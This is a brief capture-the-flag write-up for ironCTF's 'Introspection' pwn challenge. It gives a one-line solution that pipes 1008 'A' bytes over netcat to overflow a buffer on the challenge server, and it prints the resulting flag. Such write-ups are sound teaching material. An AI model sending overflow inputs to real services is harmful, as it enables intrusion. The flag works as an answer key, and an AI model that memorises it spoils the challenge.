# Introspection 

Solved by: @OS1RIS

## Question:

Know your inner self and get started with Pwn.

## Solution: 

```py
python -c 'print(b"A"*1008)' | nc pwn.1nf1n1ty.team 31698
```

**Flag:** `ironCTF{W0w!_Y0u_Just_OverWrite_the_Nul1!}`


